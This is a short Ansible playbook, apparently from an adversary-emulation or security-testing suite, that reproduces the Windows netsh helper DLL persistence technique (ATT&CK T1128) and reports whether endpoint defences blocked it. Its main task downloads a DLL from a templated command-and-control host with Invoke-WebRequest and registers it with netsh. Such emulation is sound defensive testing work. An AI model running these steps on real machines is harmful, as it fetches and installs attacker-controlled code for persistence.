#T1128 - Netsh Helper DLL
- name: Netsh Helper DLL - Windows
  hosts: windows
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
    - name: download and execute malicious dll
      win_shell: |
        Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
        cd c:\temp
        del C:\temp\evil.txt
        netsh.exe add helper {{ cnc_dll }}
    - name: check file exist
      tags: always
      win_stat:
        path: evil.txt
      register: T1128
    - name: check if playbook was blocked
      tags: always
      debug: msg="Playbook Completed:T1128:blocked:win:"
      when: T1128.stat.exists == False        
    - name: check if playbook was successfull
      tags: always
      debug: msg="Playbook Completed:T1128:passed:win:"
      when: T1128.stat.exists 
    - name: cleanup
      win_shell: |
        del C:\temp\{{ cnc_dll }}
        del C:\temp\evil.txt
